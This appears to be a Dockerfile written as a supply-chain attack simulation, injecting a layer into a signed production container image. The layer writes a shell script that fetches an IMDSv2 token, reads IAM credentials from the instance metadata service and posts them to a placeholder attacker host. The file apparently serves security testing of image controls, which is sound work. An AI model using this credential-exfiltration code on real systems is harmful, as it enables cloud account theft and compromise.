# Attack simulation: adversary with push access takes the legit signed image
# and injects a malicious layer, then pushes under a plausible tag.
# The layer is an IMDSv2 credential-exfil stub (TeamTNT / Capital One pattern).
# Exfil endpoint is a placeholder — demonstrates the technique, steals nothing.
FROM 221082197153.dkr.ecr.us-east-1.amazonaws.com/scs-prod-ecr-app:git-2b0a3d797885
USER root
RUN printf '#!/bin/sh\n\
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60")\n\
CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)\n\
curl -s -X POST "https://attacker.example.com/collect" -d "$CREDS" || true\n' > /usr/local/bin/beacon.sh \
  && chmod +x /usr/local/bin/beacon.sh
USER 1000:1000
